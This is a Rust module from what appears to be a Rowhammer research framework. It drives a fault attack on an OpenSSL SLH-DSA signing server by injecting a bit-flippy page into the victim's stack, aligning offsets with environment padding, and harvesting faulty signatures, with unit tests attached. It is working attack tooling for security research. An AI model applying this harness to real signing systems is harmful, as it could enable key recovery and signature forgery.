use crate::config::*;
use crate::{
    BIO_free, BIO_new_mem_buf, ERR_error_string, ERR_get_error, EVP_PKEY_CTX_free,
    EVP_PKEY_CTX_new_from_pkey, EVP_PKEY_free, EVP_PKEY_verify, EVP_PKEY_verify_message_init,
    EVP_SIGNATURE_fetch, EVP_SIGNATURE_free, PEM_read_bio_PUBKEY, ossl_param_st,
};
use anyhow::{Context, bail};
use libc::sched_getcpu;
use log::{debug, error, info, warn};
use serde::Serialize;
use std::ffi::{CString, c_char, c_int, c_void};
use std::fs::OpenOptions;
use std::io;
use std::io::Write;
use std::mem::replace;
use std::process::Child;
use std::process::ChildStdout;
use std::ptr;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::{fs, sync::Mutex};
use std::{
    io::{BufRead, BufReader, Read},
    thread,
    time::{Duration, Instant},
};
use swage::memory::{BitFlip, FlipDirection, PfnResolver, PhysAddr, find_flippy_page};
use swage::util::{
    PAGE_MASK, PAGE_SIZE,
    cancelable_thread::{CancelableJoinHandle, spawn_cancelable},
};
use swage::victim::{
    BuddyPageInjector, HammerVictimError, InjectionConfig, PageInjector, VictimOrchestrator,
    VictimResult,
};

const OSSL_PARAM_OCTET_STRING: u32 = 5;
const OSSL_PARAM_END_VALUE: ossl_param_st = ossl_param_st {
    key: std::ptr::null(),
    data_type: 0,
    data: std::ptr::null_mut(),
    data_size: 0,
    return_size: 0,
};

#[derive(Serialize)]
enum State {
    Init {
        env: Vec<(String, String)>,
        injection_config: InjectionConfig,
    },
    Running {
        target: String,
        #[serde(skip_serializing)]
        signatures: Arc<Mutex<Vec<String>>>,
        #[serde(skip_serializing)]
        child: std::process::Child,
        #[serde(skip_serializing)]
        stderr_logger: Option<thread::JoinHandle<()>>,
        #[serde(skip_serializing)]
        checker: CancelableJoinHandle<()>,
        target_pfn: PhysAddr,
        injection_config: InjectionConfig,
    },
    Stopped,
}

#[derive(Serialize)]
pub struct OsslSlhDsa {
    state: State,
}

fn set_process_affinity(pid: libc::pid_t, core_id: usize) {
    use libc::{CPU_SET, CPU_ZERO, cpu_set_t, sched_setaffinity};

    unsafe {
        let mut cpuset: cpu_set_t = std::mem::zeroed();
        CPU_ZERO(&mut cpuset);
        CPU_SET(core_id, &mut cpuset);

        let result = sched_setaffinity(pid, std::mem::size_of::<cpu_set_t>(), &cpuset);
        if result != 0 {
            eprintln!(
                "Failed to set process affinity: {}",
                std::io::Error::last_os_error()
            );
        }
    }
}

fn get_current_core() -> usize {
    unsafe {
        let core_id = sched_getcpu();
        if core_id < 0 {
            panic!(
                "Failed to get current core: {}",
                std::io::Error::last_os_error()
            );
        } else {
            core_id as usize
        }
    }
}

// find profile entry with bitflips in needed range
#[derive(Clone, Debug, Serialize)]
pub struct TargetOffset {
    id: usize,
    description: &'static str,
    pub page_offset: usize,
    stack_offset: usize,
    pub target_size: usize,
    pub flip_direction: FlipDirection,
}

const BINARY_PATH: &str = "swage-victim-ossl-slh-dsa/victim/";
// Binary name is constructed from algorithm name
const BINARY: &str = const_str::concat!(BINARY_PATH, "server_", ALGONAME, OSSL_SLH_DSA_VARIANT);
const KEY_FILE: &str = const_str::concat!(BINARY_PATH, "pk_", ALGONAME, ".pub");
const SIGS_FILE: &str = const_str::concat!(BINARY_PATH, "sigs_ossl_", ALGONAME, OSSL_SLH_DSA_VARIANT, ".txt");

const TARGET_OFFSETS: [TargetOffset; 2] = [
    TargetOffset {
        id: 0,
        description: "lnode top layer",
        page_offset: LNODE_BASE,
        stack_offset: STACK_OFFSET,
        target_size: SPX_N,
        flip_direction: FlipDirection::Any,
    },
    TargetOffset {
        id: 1,
        description: "rnode top layer",
        page_offset: RNODE_BASE,
        stack_offset: STACK_OFFSET,
        target_size: SPX_N,
        flip_direction: FlipDirection::Any,
    },
];

const TARGET_SHAKE256S: &TargetOffset = &TARGET_OFFSETS[0];

impl OsslSlhDsa {
    /// Create a new OpenSSL SLH-DSA victim.
    pub fn new(flip: BitFlip) -> anyhow::Result<Self> {
        let mut target = TARGET_SHAKE256S.clone();
        let (env, page_overflow) = make_env_for(flip.addr, target.page_offset);
        if page_overflow {
            target.stack_offset -= 1;
        }
        let bait_count_after = lookup_stack_injection_count(target.stack_offset, env.len())?;

        info!(
            "Using stack offset {} and bait count after {}",
            target.stack_offset, bait_count_after
        );

        let injection_config = InjectionConfig {
            id: target.id,
            target_addr: flip.addr,
            flippy_page_size: PAGE_SIZE,
            bait_count_after,
            bait_count_before: 0,
            stack_offset: target.stack_offset,
        };
        Ok(Self {
            state: State::Init {
                injection_config,
                env: vec![(env, String::new())],
            },
        })
    }

    pub fn new_with_config(
        injection_config: InjectionConfig,
        env: Vec<(String, String)>,
    ) -> anyhow::Result<Self> {
        Ok(Self {
            state: State::Init {
                injection_config,
                env,
            },
        })
    }
}

fn make_env_for(flippy_addr: usize, target_offset: usize) -> (String, bool) {
    let flippy_offset = flippy_addr & PAGE_MASK;
    let target_offset = target_offset & PAGE_MASK;
    let overflow = target_offset < flippy_offset;
    let target_offset = if overflow {
        target_offset + PAGE_SIZE - 1
    } else {
        target_offset
    };
    let offset = target_offset - flippy_offset;
    info!(target: "env_fixer",
        "flippy_offset: 0x{:x}, target_offset: 0x{:x}, offset: 0x{:x}",
        flippy_offset, target_offset, offset
    );
    ("A".repeat(offset), overflow) // if target_offset < flippy_offset, we overflow a page boundary and have to subtract 1 from the region offset
}

impl VictimOrchestrator for OsslSlhDsa {
    fn start(&mut self) -> Result<(), HammerVictimError> {
        match &self.state {
            State::Init {
                injection_config,
                env,
            } => {
                let pwd = format!(
                    "{}/{}/",
                    std::env::current_dir().unwrap().display(),
                    BINARY_PATH,
                );
                set_process_affinity(unsafe { libc::getpid() }, get_current_core());
                let mut cmd = std::process::Command::new(format!("{}/{}", std::env::current_dir().unwrap().display(), BINARY));
                //cmd.arg(injection_config.target_addr.to_string());
                cmd.current_dir(pwd.clone());
                cmd.stdin(std::process::Stdio::piped());
                cmd.stdout(std::process::Stdio::piped());
                cmd.stderr(std::process::Stdio::piped());
                cmd.env_clear();
                cmd.envs(env.iter().cloned());
                debug!("Victim command: {:?}", cmd);
                let mut page_injector = BuddyPageInjector::new(cmd, *injection_config);
                let target_pfn = (injection_config.target_addr as *const libc::c_void)
                    .pfn()
                    .expect("PFN resolve failed");
                debug!(
                    "Injecting {:p} (phys {:p}) into victim process",
                    injection_config.target_addr as *const libc::c_void, target_pfn
                );
                let mut child = page_injector.inject().expect("Failed to inject page");
                info!("Victim launched");

                // Log victim stderr
                let stderr_logger = if let Some(stderr) = child.stderr.take() {
                    let reader = BufReader::new(stderr);

                    // Spawn a thread to handle logging from stderr
                    let handle = thread::spawn(move || {
                        for line in reader.lines() {
                            match line {
                                Ok(log_line) => {
                                    info!(target: &format!("{}{}", &pwd, BINARY), "{}", log_line);
                                }
                                Err(err) => {
                                    error!(target: &format!("{}{}", &pwd, BINARY), "Error reading line from child process: {}", err)
                                }
                            }
                        }
                    });
                    Some(handle)
                } else {
                    eprintln!("Failed to capture stderr");
                    child.kill().expect("kill");
                    child.wait().expect("wait");
                    None
                };

                // Pin the child to the next core
                let num_cores = unsafe { libc::sysconf(libc::_SC_NPROCESSORS_ONLN) };
                let target_core = (get_current_core() + 1) % num_cores as usize;
                let cid = child.id();
                info!("Pinning procees {} to core {}", cid, target_core);
                set_process_affinity(cid as libc::pid_t, target_core);

                let stdout = child.stdout.take().expect("stdout");
                let signatures = Arc::new(Mutex::new(vec![]));
                let sigs = Arc::clone(&signatures);

                let checker = spawn_cancelable(move |r| process_victim_signatures(stdout, sigs, r));

                self.state = State::Running {
                    target: BINARY.into(),
                    child,
                    signatures,
                    stderr_logger,
                    checker,
                    target_pfn,
                    injection_config: *injection_config,
                };

                // find flippy page
                thread::sleep(Duration::from_millis(100)); // wait before checking for flippy page, as victim might need some time to allocate the stack
                if let Err(e) = self.check_flippy_page_exists() {
                    Err(e)
                } else {
                    Ok(())
                }
            }
            s => {
                let state = match s {
                    State::Init { .. } => "Init",
                    State::Running { .. } => "Running",
                    State::Stopped => "Stopped",
                };
                error!("Unexpected state {}", state);
                Err(HammerVictimError::NotRunning)
            }
        }
    }

    fn init(&mut self) {
        match &mut self.state {
            State::Running { .. } => {
                // No-op
            }
            _ => panic!("Victim not running"),
        }
    }

    fn check(&mut self) -> Result<VictimResult, HammerVictimError> {
        self.check_flippy_page_exists()?;
        match &self.state {
            State::Running {
                child,
                signatures,
                checker,
                ..
            } => {
                let running = checker.is_running();
                if !running {
                    warn!("Checker stopped. Goodbye.");
                    return Err(HammerVictimError::NotRunning);
                }
                let pstate = child.pstate().expect("pstate");
                if !pstate.is_running() {
                    error!("Unexpected pstate {:?}", pstate);
                    return Err(HammerVictimError::NotRunning);
                }
                if signatures.lock().unwrap().is_empty() {
                    Err(HammerVictimError::NoFlips)
                } else {
                    let mut signatures = signatures.lock().unwrap();
                    let sigs = signatures.clone();
                    signatures.clear();
                    Ok(VictimResult::Strings(sigs))
                }
            }
            _ => Err(HammerVictimError::NotRunning),
        }
    }

    fn stop(&mut self) {
        let state = replace(&mut self.state, State::Stopped);
        if let State::Running {
            mut child,
            mut stderr_logger,
            checker,
            ..
        } = state
        {
            debug!("Killing victim");
            child.kill().expect("kill");
            debug!("Waiting for checker thread to stop");
            let _ = checker.join();
            if let Some(stderr_logger) = stderr_logger.take() {
                debug!("Waiting for logger thread to stop");
                stderr_logger.join().expect("join");
            }
            debug!("Waiting for victim to stop");
            child.wait().expect("wait");
            debug!("Done stopping.");
        }
    }
    fn serialize(&self) -> Option<serde_json::Value> {
        serde_json::to_value(&self.state)
            .ok()
            .or(Some(serde_json::Value::String(
                "Failed to convert state to JSON".into(),
            )))
    }
}

trait IsRunning {
    fn is_running(&self) -> bool;
}

impl IsRunning for ProcState {
    fn is_running(&self) -> bool {
        match self {
            ProcState::Dead | ProcState::Stopped | ProcState::Zombie | ProcState::Unknown(_) => {
                false
            }
            ProcState::Running | ProcState::Sleeping | ProcState::DiskSleep | ProcState::Traced => {
                true
            }
        }
    }
}

fn process_victim_signatures(
    mut stdout: ChildStdout,
    signatures: Arc<Mutex<Vec<String>>>,
    running: Arc<AtomicBool>,
) {
    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(SIGS_FILE)
        .expect("Failed to open signature file");
    const CONSEC_FAULTY_LIMIT: usize = 10;
    let mut consec_faulty = 0;
    loop {
        debug!("Waiting for victim to send signature");
        if !running.load(Ordering::Relaxed) {
            return;
        }
        let signature = stdout.read_line();
        let signature = match signature {
            Ok(signature) => signature,
            Err(e) => match e.kind() {
                std::io::ErrorKind::UnexpectedEof => {
                    error!("Failed to read signature from victim process with error {}. Did the victim die?", e);
                    return;
                }
                std::io::ErrorKind::WouldBlock => {
                    error!("Failed to read signature from victim process with error {}. Did the victim die?", e);
                    return;
                }
                _ => {
                    error!("Error reading line from child process: {}", e);
                    continue;
                }
            },
        };
        let sig = hex::decode(signature.clone()).expect("Failed to decode signature");

        // Try to verify the signature using OpenSSL SLH-DSA
        match ossl_slh_dsa_open(sig, KEY_FILE) {
            Ok(message) => {
                debug!("Valid signature verified, message: {}", message);
                writeln!(file, "{}", signature).expect("Failed to write to signature file");
                consec_faulty = 0;
            }
            Err(e) => {
                debug!("Signature verification failed: {}", e);
                writeln!(file, "{}", signature).expect("Failed to write to signature file");
                signatures.lock().unwrap().push(signature);
                consec_faulty += 1;
                if consec_faulty >= CONSEC_FAULTY_LIMIT {
                    warn!(
                        "Too many consecutive faulty signatures ({}), stopping",
                        consec_faulty
                    );
                    return;
                }
            }
        }
    }
}

pub fn ossl_slh_dsa_open(sig: Vec<u8>, keys_file: &str) -> anyhow::Result<String> {
    debug!(
        "OpenSSL SLH-DSA: Starting signature verification, sig_len={}",
        sig.len()
    );

    // Always expect signature + message format (signature || message)
    if sig.len() <= SIG_BYTES {
        anyhow::bail!(
            "Invalid signature format: {} bytes (expected > {} for signature+message)",
            sig.len(),
            SIG_BYTES
        );
    }

    // Extract signature and message components
    let signature_bytes = &sig[0..SIG_BYTES];
    let message_bytes = &sig[SIG_BYTES..];

    debug!(
        "OpenSSL SLH-DSA: Signature+message format: sig={} bytes, msg={} bytes",
        signature_bytes.len(),
        message_bytes.len()
    );

    // Load the public key from the keys file
    let public_key_pem = load_public_key_pem(keys_file)?;

    // Perform cryptographic verification using OpenSSL EVP API
    let verification_result =
        verify_slh_dsa_signature_pem(&public_key_pem, signature_bytes, message_bytes)?;

    if verification_result {
        // Return the extracted message
        let message = String::from_utf8_lossy(message_bytes).to_string();
        debug!(
            "OpenSSL SLH-DSA: Signature verification successful, message: '{}'",
            message.trim()
        );
        Ok(message)
    } else {
        anyhow::bail!("SLH-DSA signature verification failed");
    }
}

fn load_public_key_pem(keys_file: &str) -> anyhow::Result<String> {
    debug!("Loading PEM public key from: {}", keys_file);

    // Try to read the PEM keys file
    let pem_content = match fs::read_to_string(keys_file) {
        Ok(content) => content,
        Err(e) => {
            anyhow::bail!("Failed to read PEM keys file '{}': {}", keys_file, e);
        }
    };

    debug!("Loaded PEM public key: {} bytes", pem_content.len());
    Ok(pem_content)
}

fn verify_slh_dsa_signature_pem(
    public_key_pem: &str,
    signature: &[u8],
    message: &[u8],
) -> anyhow::Result<bool> {
    debug!(
        "Starting SLH-DSA verification with context: pem={} bytes, sig={} bytes, msg={} bytes",
        public_key_pem.len(),
        signature.len(),
        message.len()
    );
    debug!(
        "PEM content preview: {}",
        &public_key_pem[..public_key_pem.len().min(100)]
    );

    unsafe {
        // Ensure PEM string is null-terminated
        let pem_cstring = std::ffi::CString::new(public_key_pem)
            .map_err(|e| anyhow::anyhow!("Failed to create C string from PEM: {}", e))?;

        // Create BIO from PEM string
        let bio = BIO_new_mem_buf(
            pem_cstring.as_ptr() as *const c_void,
            pem_cstring.as_bytes().len() as c_int,
        );
        if bio.is_null() {
            anyhow::bail!("Failed to create BIO from PEM data");
        }

        // Read public key from PEM
        let pkey = PEM_read_bio_PUBKEY(bio, ptr::null_mut(), None, ptr::null_mut());
        BIO_free(bio);

        if pkey.is_null() {
            let error_msg = get_openssl_error();
            anyhow::bail!("Failed to parse PEM public key: {}", error_msg);
        }

        // Create verification context from the public key (match OpenSSL test approach)
        let ctx = EVP_PKEY_CTX_new_from_pkey(ptr::null_mut(), pkey, ptr::null());
        if ctx.is_null() {
            EVP_PKEY_free(pkey);
            anyhow::bail!("Failed to create EVP_PKEY_CTX from pkey");
        }

        // Fetch the SLH-DSA signature algorithm
        let alg_name = std::ffi::CString::new(ALGONAME).unwrap();
        let sig_alg = EVP_SIGNATURE_fetch(ptr::null_mut(), alg_name.as_ptr(), ptr::null());
        if sig_alg.is_null() {
            EVP_PKEY_CTX_free(ctx);
            EVP_PKEY_free(pkey);
            anyhow::bail!("Failed to fetch SLH-DSA signature algorithm");
        }

        // Set up context string parameter (must match the server's context string exactly)
        let context_str = b"SLH-DSA test context";
        let context_key = CString::new("context-string").unwrap();
        let verify_params = [
            ossl_param_st {
                key: context_key.as_ptr(),
                data_type: OSSL_PARAM_OCTET_STRING,
                data: context_str.as_ptr() as *mut c_void,
                data_size: 20, // Length must match server exactly
                return_size: 0,
            },
            OSSL_PARAM_END_VALUE,
        ];

        // Initialize message verification with context string to match signing
        let result = EVP_PKEY_verify_message_init(ctx, sig_alg, verify_params.as_ptr());
        if result <= 0 {
            EVP_SIGNATURE_free(sig_alg);
            EVP_PKEY_CTX_free(ctx);
            EVP_PKEY_free(pkey);
            let error_msg = get_openssl_error();
            anyhow::bail!(
                "Failed to initialize message verification with context: {}",
                error_msg
            );
        }

        // Perform the verification using EVP_PKEY_verify (not EVP_PKEY_verify_message_final)
        let verify_result = EVP_PKEY_verify(
            ctx,
            signature.as_ptr(),
            signature.len(),
            message.as_ptr(),
            message.len(),
        );

        // Clean up resources
        EVP_SIGNATURE_free(sig_alg);
        EVP_PKEY_CTX_free(ctx);
        EVP_PKEY_free(pkey);

        match verify_result {
            1 => {
                debug!("SLH-DSA signature verification with context: SUCCESS");
                Ok(true)
            }
            0 => {
                debug!("SLH-DSA signature verification with context: FAILED (invalid signature)");
                Ok(false)
            }
            _ => {
                let error_msg = get_openssl_error();
                anyhow::bail!("SLH-DSA verification error with context: {}", error_msg);
            }
        }
    }
}

fn get_openssl_error() -> String {
    unsafe {
        let error_code = ERR_get_error();
        if error_code == 0 {
            return "Unknown OpenSSL error".to_string();
        }

        let mut buffer = [0u8; 256];
        let error_str = ERR_error_string(error_code, buffer.as_mut_ptr() as *mut c_char);
        if error_str.is_null() {
            return format!("OpenSSL error code: {}", error_code);
        }

        let c_str = std::ffi::CStr::from_ptr(error_str);
        c_str.to_string_lossy().to_string()
    }
}

impl OsslSlhDsa {
    fn check_flippy_page_exists(&self) -> Result<(), HammerVictimError> {
        if let State::Running {
            child,
            target_pfn,
            injection_config,
            ..
        } = &self.state
        {
            let flippy_page = find_flippy_page(*target_pfn, child.id());
            match flippy_page {
                Ok(Some(flippy_page)) => {
                    info!("Flippy page found: {:?}", flippy_page);
                    if flippy_page.region_offset != injection_config.stack_offset {
                        warn!(
                            "Flippy page offset mismatch: {} != {}",
                            flippy_page.region_offset, injection_config.stack_offset
                        );
                        return Err(HammerVictimError::FlippyPageOffsetMismatch {
                            expected: injection_config.stack_offset,
                            actual: flippy_page,
                        });
                    }
                    return Ok(());
                }
                Ok(None) => {
                    return Err(HammerVictimError::FlippyPageNotFound);
                }
                Err(e) => return Err(HammerVictimError::LinuxPageMapError(e.into())),
            }
        }
        Err(HammerVictimError::NotRunning)
    }
}

pub trait ReadLine {
    fn read_line(&mut self) -> std::io::Result<String>;
}

impl ReadLine for std::process::ChildStdout {
    fn read_line(&mut self) -> std::io::Result<String> {
        let mut out = Vec::new();
        let mut buf = [0; 1];
        let mut last_recv = None;
        const READ_TIMEOUT: Duration = Duration::from_millis(1);
        loop {
            let nbytes = self.read(&mut buf)?;
            if nbytes == 0 && last_recv.is_none() {
                return Err(std::io::Error::from(std::io::ErrorKind::WouldBlock));
            }
            if nbytes == 0 && last_recv.is_some_and(|t: Instant| t.elapsed() > READ_TIMEOUT) {
                return Err(std::io::Error::from(std::io::ErrorKind::WouldBlock));
            }
            if nbytes == 0 {
                continue;
            }
            if buf[0] == b'\n' {
                break;
            }
            last_recv = Some(std::time::Instant::now());
            out.push(buf[0]);
        }
        let out = String::from_utf8(out).expect("utf8");
        Ok(out)
    }
}

/// Enum representing simplified process states.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ProcState {
    Running,
    Sleeping,
    DiskSleep,
    Zombie,
    Stopped,
    Traced,
    Dead,
    Unknown(char),
}

impl ProcState {
    fn from_stat_code(c: char) -> Self {
        match c {
            'R' => ProcState::Running,
            'S' => ProcState::Sleeping,
            'D' => ProcState::DiskSleep,
            'Z' => ProcState::Zombie,
            'T' => ProcState::Stopped,
            't' => ProcState::Traced,
            'X' | 'x' => ProcState::Dead,
            other => ProcState::Unknown(other),
        }
    }
}

/// Trait for querying the state of a process.
trait ProcessState {
    fn pstate(&self) -> io::Result<ProcState>;
}

impl ProcessState for Child {
    fn pstate(&self) -> io::Result<ProcState> {
        let pid = self.id();
        let stat_path = format!("/proc/{}/stat", pid);
        let contents = fs::read_to_string(stat_path)?;

        // According to proc(5), the state is the third field (after pid and comm)
        let start = contents
            .find(')')
            .ok_or_else(|| io::Error::new(io::ErrorKind::InvalidData, "Malformed stat file"))?;
        let rest = &contents[start + 2..]; // skip ") "
        let state_char = rest
            .split_whitespace()
            .next()
            .ok_or_else(|| io::Error::new(io::ErrorKind::InvalidData, "Empty stat fields"))?;

        Ok(ProcState::from_stat_code(
            state_char.chars().next().unwrap_or('?'),
        ))
    }
}

/// Performs a lookup in inject.log to count bait_after values where:
/// - FlippyPage has [stack] pathname
/// - region_offset == x
/// - y <= env_length <= y + 128
pub fn lookup_stack_injection_count(
    region_offset: usize,
    env_length: usize,
) -> anyhow::Result<usize> {
    use std::fs::File;
    use std::io::{BufRead, BufReader};

    let file = File::open("config/inject.log").context("Failed to open inject.log")?;
    let reader = BufReader::new(file);
    let mut lines = reader.lines();

    while let Some(line) = lines.next() {
        let line = line?;

        // Look for bait_after,bait_before,env_length lines
        if line.starts_with("bait_after,bait_before,env_length:") {
            // Parse the values: "bait_after,bait_before,env_length: X,Y,Z"
            if let Some(values_part) = line.split(':').nth(1) {
                let values: Vec<&str> = values_part.trim().split(',').collect();
                if values.len() == 3
                    && let (Ok(bait_after), Ok(_bait_before), Ok(env_length_f)) = (
                        values[0].trim().parse::<usize>(),
                        values[1].trim().parse::<usize>(),
                        values[2].trim().parse::<usize>(),
                    )
                {
                    // Check if env_length is in the desired range
                    if env_length_f <= env_length && env_length <= env_length_f + 128 {
                        // Read the next line to check if it's a FlippyPage with [stack]
                        if let Some(next_line) = lines.next() {
                            let next_line = next_line?;

                            // Check if it's a FlippyPage with [stack] pathname
                            if next_line.contains("FlippyPage")
                                && next_line.contains("pathname: Some(\"[stack]\")")
                            {
                                // Extract region_offset value
                                if let Some(region_offset_str) = extract_region_offset(&next_line)
                                    && let Ok(region_offset_f) = region_offset_str.parse::<usize>()
                                    && region_offset == region_offset_f
                                {
                                    return Ok(bait_after);
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    bail!(
        "No bait page count found in inject.log for region offset {} and env_length {}",
        region_offset,
        env_length
    )
}

/// Helper function to extract region_offset value from a FlippyPage line
fn extract_region_offset(line: &str) -> Option<&str> {
    // Look for "region_offset: " followed by a number
    if let Some(start) = line.find("region_offset: ") {
        let start_pos = start + "region_offset: ".len();
        let remaining = &line[start_pos..];

        // Find the end of the number (look for space or closing brace)
        if let Some(end) = remaining.find(' ') {
            Some(&remaining[..end])
        } else if let Some(end) = remaining.find('}') {
            Some(&remaining[..end])
        } else {
            Some(remaining.trim())
        }
    } else {
        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::process::Command;

    #[test]
    fn test_lookup_stack_injection_count_functional() {
        // Test the lookup function with specific expected values from inject.log
        // This test will only run if inject.log exists in the current directory
        if std::path::Path::new("../../../inject.log").exists() {
            // Test case 1: region_offset=32, env_length=0 should return bait_after=1
            let result = lookup_stack_injection_count(32, 0);
            assert!(
                result.is_ok(),
                "Function should succeed for region_offset=32, env_length=0"
            );
            let bait_after = result.unwrap();
            assert_eq!(
                bait_after, 1,
                "Expected bait_after=1 for region_offset=32, env_length=0"
            );
            println!(
                "✓ region_offset=32, env_length=0 -> bait_after={}",
                bait_after
            );

            // Test case 2: region_offset=31, env_length=0 should return bait_after=9
            let result = lookup_stack_injection_count(31, 0);
            assert!(
                result.is_ok(),
                "Function should succeed for region_offset=31, env_length=0"
            );
            let bait_after = result.unwrap();
            assert_eq!(
                bait_after, 9,
                "Expected bait_after=9 for region_offset=31, env_length=0"
            );
            println!(
                "✓ region_offset=31, env_length=0 -> bait_after={}",
                bait_after
            );

            // Test case 3: region_offset=32, env_length=128 should return bait_after=1
            let result = lookup_stack_injection_count(32, 128);
            assert!(
                result.is_ok(),
                "Function should succeed for region_offset=32, env_length=128"
            );
            let bait_after = result.unwrap();
            assert_eq!(
                bait_after, 1,
                "Expected bait_after=1 for region_offset=32, env_length=128"
            );
            println!(
                "✓ region_offset=32, env_length=128 -> bait_after={}",
                bait_after
            );

            // Test case 4: region_offset=31, env_length=128 should return bait_after=9
            let result = lookup_stack_injection_count(31, 128);
            assert!(
                result.is_ok(),
                "Function should succeed for region_offset=31, env_length=128"
            );
            let bait_after = result.unwrap();
            assert_eq!(
                bait_after, 9,
                "Expected bait_after=9 for region_offset=31, env_length=128"
            );
            println!(
                "✓ region_offset=31, env_length=128 -> bait_after={}",
                bait_after
            );

            // Test case 5: region_offset=32, env_length=1792 should return bait_after=1
            let result = lookup_stack_injection_count(32, 1792);
            assert!(
                result.is_ok(),
                "Function should succeed for region_offset=32, env_length=1792"
            );
            let bait_after = result.unwrap();
            assert_eq!(
                bait_after, 1,
                "Expected bait_after=1 for region_offset=32, env_length=1792"
            );
            println!(
                "✓ region_offset=32, env_length=1792 -> bait_after={}",
                bait_after
            );

            // Test case 6: Test edge case - env_length in middle of range
            let result = lookup_stack_injection_count(32, 64); // Should find env_length=0 (64 is in range [0, 128])
            assert!(
                result.is_ok(),
                "Function should succeed for region_offset=32, env_length=64"
            );
            let bait_after = result.unwrap();
            assert_eq!(
                bait_after, 1,
                "Expected bait_after=1 for region_offset=32, env_length=64"
            );
            println!(
                "✓ region_offset=32, env_length=64 -> bait_after={}",
                bait_after
            );

            // Test case 7: Test another edge case
            let result = lookup_stack_injection_count(31, 100); // Should find env_length=0 (100 is in range [0, 128])
            assert!(
                result.is_ok(),
                "Function should succeed for region_offset=31, env_length=100"
            );
            let bait_after = result.unwrap();
            assert_eq!(
                bait_after, 9,
                "Expected bait_after=9 for region_offset=31, env_length=100"
            );
            println!(
                "✓ region_offset=31, env_length=100 -> bait_after={}",
                bait_after
            );

            println!("All functional tests passed!");
        } else {
            println!("Skipping functional tests - inject.log not found");
        }
    }

    #[test]
    fn test_lookup_stack_injection_count_error_cases() {
        // Test error cases
        if std::path::Path::new("../../../inject.log").exists() {
            // Test case: Non-existent region_offset should return error
            let result = lookup_stack_injection_count(999, 0);
            assert!(
                result.is_err(),
                "Function should fail for non-existent region_offset=999"
            );
            println!("✓ Correctly failed for non-existent region_offset=999");

            // Test case: Non-existent env_length should return error
            let result = lookup_stack_injection_count(32, 5000); // Way outside any reasonable range
            assert!(
                result.is_err(),
                "Function should fail for non-existent env_length=5000"
            );
            println!("✓ Correctly failed for non-existent env_length=5000");

            println!("All error case tests passed!");
        } else {
            println!("Skipping error case tests - inject.log not found");
        }
    }

    #[test]
    fn test_lookup_stack_injection_count_range_behavior() {
        // Test the range behavior (y <= env_length <= y + 128)
        if std::path::Path::new("../../../inject.log").exists() {
            // Test that we can find entries within the 128-byte range
            // For env_length_y=0, we should match env_length values 0, 128 but not 129

            // This should work - finds env_length=0 when searching for y=0
            let result = lookup_stack_injection_count(32, 0);
            assert!(
                result.is_ok(),
                "Should find entry for region_offset=32, env_length_y=0"
            );

            // This should work - finds env_length=128 when searching for y=0 (0 <= 128 <= 128)
            let result = lookup_stack_injection_count(32, 0);
            assert!(
                result.is_ok(),
                "Should find entry for region_offset=32 in range [0, 128]"
            );

            // Test boundary: y=1792 should find env_length=1792
            let result = lookup_stack_injection_count(32, 1792);
            assert!(
                result.is_ok(),
                "Should find entry for region_offset=32, env_length_y=1792"
            );

            println!("✓ Range behavior tests passed!");
        } else {
            println!("Skipping range behavior tests - inject.log not found");
        }
    }

    #[test]
    fn test_extract_region_offset() {
        // Test the helper function with various formats
        let test_cases = vec![
            ("region_offset: 32 }", Some("32")),
            ("region_offset: 31 }", Some("31")),
            ("region_offset: 123 }", Some("123")),
            ("something else", None),
            ("region_offset: 0 }", Some("0")),
        ];

        for (input, expected) in test_cases {
            let result = extract_region_offset(input);
            assert_eq!(result, expected, "Failed for input: '{}'", input);
        }
    }

    #[test]
    fn test_slh_dsa_signature_verification_integration() -> anyhow::Result<()> {
        // Skip test if OpenSSL server is not available
        if !std::path::Path::new("victims/openssl/server").exists() {
            panic!(
                "OpenSSL server binary not found! Build it using make -C victims/openssl server"
            );
        }

        if !std::path::Path::new(KEY_FILE).exists() {
            panic!(
                "OpenSSL SLH-DSA pk not found! Generate it using `cd victims/openssl && timeout 1s ./server`"
            );
        }

        println!("Testing complete SLH-DSA signature verification flow");

        // Get a signature from the server
        println!("Getting signature from OpenSSL server...");
        let output = Command::new("bash")
            .arg("-c")
            .arg("cd victims/openssl && LD_LIBRARY_PATH=./openssl timeout 5s ./server | head -10")
            .output()
            .expect("Failed to run OpenSSL server");

        let server_output = String::from_utf8_lossy(&output.stdout);
        let lines: Vec<&str> = server_output.lines().collect();

        if lines.is_empty() {
            panic!("No output from OpenSSL server");
        }

        let signature_hex = lines[0];
        assert!(!signature_hex.is_empty(), "Signature should not be empty");
        println!("Found signature ({} chars)", signature_hex.len());

        // Test with the actual ossl_slh_dsa_open function
        println!("Testing ossl_slh_dsa_open with real cryptographic verification...");

        // Decode signature to bytes
        let sig_bytes = hex::decode(signature_hex.trim())?;
        assert!(
            !sig_bytes.is_empty(),
            "Decoded signature should not be empty"
        );
        println!("Decoded signature to {} bytes", sig_bytes.len());

        // Call the enhanced ossl_slh_dsa_open function
        match ossl_slh_dsa_open(sig_bytes, KEY_FILE) {
            Ok(message) => {
                println!("✅ ossl_slh_dsa_open succeeded!");
                println!("Recovered message: '{}'", message);

                // The function should return some result (message can be empty for fixed test message)
                Ok(())
            }
            Err(e) => {
                panic!("ossl_slh_dsa_open failed: {}", e);
            }
        }
    }

    #[test]
    fn test_slh_dsa_open_with_invalid_signature() {
        let invalid_sig = vec![0u8; 100]; // Too small signature

        // Skip if key file doesn't exist
        if !std::path::Path::new(KEY_FILE).exists() {
            return;
        }

        let result = ossl_slh_dsa_open(invalid_sig, KEY_FILE);
        assert!(result.is_err(), "Should fail with invalid signature");
    }

    #[test]
    fn test_slh_dsa_open_with_nonexistent_key_file() {
        let sig_bytes = vec![0u8; 30000]; // Proper size but invalid content
        let nonexistent_key_path = "nonexistent/key/file.pub";

        let result = ossl_slh_dsa_open(sig_bytes, nonexistent_key_path);
        assert!(result.is_err(), "Should fail with nonexistent key file");
    }

    #[test]
    fn test_hex_decode_functionality() {
        // Test that hex decoding works as expected
        let hex_string = "48656c6c6f20576f726c64"; // "Hello World" in hex
        let decoded = hex::decode(hex_string).unwrap();
        let message = String::from_utf8(decoded).unwrap();
        assert_eq!(message, "Hello World");
    }
}
